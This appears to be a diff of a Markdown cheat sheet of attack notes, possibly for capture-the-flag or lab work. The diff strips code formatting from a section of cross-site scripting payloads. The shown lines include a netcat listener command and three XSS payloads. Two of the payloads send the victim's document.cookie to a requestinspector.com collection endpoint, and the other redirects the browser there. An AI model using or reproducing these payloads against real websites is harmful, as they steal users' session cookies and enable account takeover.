@@ -66,9 +66,9 @@ nc -nlvp 1234
 
 ### xss payloads
 
-`<script>window.location=`https://01hh4df1c5qk1fjks5n8spq9zn00-e4e6c9cb80653f2a86a1.requestinspector.com/${document.cookie}`</script>`
+<script>window.location=`https://01hh4df1c5qk1fjks5n8spq9zn00-e4e6c9cb80653f2a86a1.requestinspector.com/${document.cookie}`</script>
 
-`<img%20src=x%20onerror=window.location=`https://01hhfejwqqkzvvfbv222c4phhm00-51a6d20d3e3a4700ffaa.requestinspector.com` />`
+<img%20src=x%20onerror=window.location=`https://01hhfejwqqkzvvfbv222c4phhm00-51a6d20d3e3a4700ffaa.requestinspector.com` />
 
 `fetch("https://01hh4df1c5qk1fjks5n8spq9zn00-e4e6c9cb80653f2a86a1.requestinspector.com?"+encodeURIComponent(document.cookie));`
 
